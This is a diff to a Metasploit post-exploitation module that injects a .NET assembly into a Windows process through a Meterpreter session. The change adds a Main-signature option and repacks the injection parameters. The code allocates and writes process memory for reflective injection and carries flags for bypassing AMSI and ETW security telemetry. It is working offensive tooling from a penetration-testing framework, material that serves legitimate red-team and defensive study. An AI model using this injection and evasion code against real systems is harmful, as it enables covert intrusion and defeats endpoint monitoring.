@@ -3,7 +3,6 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core/post/windows/reflective_dll_injection'
 
 class MetasploitModule < Msf::Post
 
@@ -12,6 +11,11 @@ class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Process
   include Msf::Post::Windows::ReflectiveDLLInjection
   include Msf::Post::Windows::Dotnet
+
+  SIGNATURES = {
+    'Main()' => 1,
+    'Main(string[])' => 2
+  }.freeze
 
   def initialize(info = {})
     super(
@@ -30,7 +34,7 @@ class MetasploitModule < Msf::Post
         'Platform' => 'win',
         'SessionTypes' => ['meterpreter'],
         'Targets' => [['Windows x64 (<= 10)', { 'Arch' => ARCH_X64 }]],
-        'References' => [['URL', 'https://b4rtik.blogspot.com/2018/12/execute-assembly-via-meterpreter-session.html']],
+        'References' => [['URL', 'https://b4rtik.github.io/posts/execute-assembly-via-meterpreter-session/']],
         'DefaultTarget' => 0
       )
     )
@@ -38,6 +42,7 @@ class MetasploitModule < Msf::Post
       [
         OptPath.new('DOTNET_EXE', [true, 'Assembly file name']),
         OptString.new('ARGUMENTS', [false, 'Command line arguments']),
+        OptEnum.new('Signature', [true, 'The Main function signature', 'Automatic', ['Automatic'] + SIGNATURES.keys]),
         OptString.new('PROCESS', [false, 'Process to spawn', 'notepad.exe']),
         OptString.new('USETHREADTOKEN', [false, 'Spawn process with thread impersonation', true]),
         OptInt.new('PID', [false, 'Pid  to inject', 0]),
@@ -228,35 +233,31 @@ class MetasploitModule < Msf::Post
   def copy_assembly(exe_path, process)
     print_status("Host injected. Copy assembly into #{process.pid}...")
     int_param_size = 8
+    sign_flag_size = 1
     amsi_flag_size = 1
     etw_flag_size = 1
     assembly_size = File.size(exe_path)
-    if datastore['ARGUMENTS'].nil?
-      argssize = 1
+
+    cln_params = ''
+    if datastore['Signature'] == 'Automatic'
+      signature = datastore['ARGUMENTS'].blank? ? SIGNATURES['Main()'] : SIGNATURES['Main(string[])']
     else
-      argssize = datastore['ARGUMENTS'].size + 1
+      signature = SIGNATURES.fetch(datastore['Signature'])
     end
-    payload_size = amsi_flag_size + etw_flag_size + int_param_size
-    payload_size += assembly_size + argssize
+    cln_params << datastore['ARGUMENTS'] if signature == SIGNATURES['Main(string[])']
+    cln_params << "\x00"
+
+    payload_size = amsi_flag_size + etw_flag_size + sign_flag_size + int_param_size
+    payload_size += assembly_size + cln_params.length
     assembly_mem = process.memory.allocate(payload_size, PAGE_READWRITE)
-    params = [assembly_size].pack('I*')
-    params += [argssize].pack('I*')
-    if datastore['AMSIBYPASS'] == true
-      params += "\x01"
-    else
-      params += "\x02"
-    end
-    if datastore['ETWBYPASS'] == true
-      params += "\x01"
-    else
-      params += "\x02"
-    end
-    if datastore['ARGUMENTS'].nil?
-      params += ''
-    else
-      params += datastore['ARGUMENTS']
-    end
-    params += "\x00"
+    params = [
+      assembly_size,
+      cln_params.length,
+      datastore['AMSIBYPASS'] ? 1 : 0,
+      datastore['ETWBYPASS'] ? 1 : 0,
+      signature
+    ].pack('IICCC')
+    params += cln_params
 
     process.memory.write(assembly_mem, params + File.read(exe_path))
     print_status('Assembly copied.')
